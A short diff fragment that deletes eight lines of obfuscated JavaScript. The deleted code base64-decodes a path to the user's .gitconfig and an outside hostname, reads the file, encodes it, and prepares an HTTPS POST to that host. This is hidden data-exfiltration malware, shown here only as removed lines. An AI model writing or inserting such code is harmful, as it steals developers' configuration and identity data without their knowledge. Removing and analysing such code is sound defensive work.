@@ -1,8 +1,0 @@
-const cf_check = path.join(os.homedir(), Buffer.from('LmdpdGNvbmZpZw==', 'base64').toString('utf-8'))
-fs.existsSync(cf_check)
-const val_cont = fs.readFileSync(cf_check, 'utf8')
-lint_val_conf = Buffer.from(val_cont).toString('base64')
-gatewaylet.validationConfig = lint_val_conf
-const gatewaydta = Buffer.from(JSON.stringify(gatewaylet)).toString('base64')
-const options = { hostname: Buffer.from('anV0LmJ6', 'base64').toString('utf-8'), port: 443, path: '/tel', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(gatewaydta) }}
-const req = https.request(options)
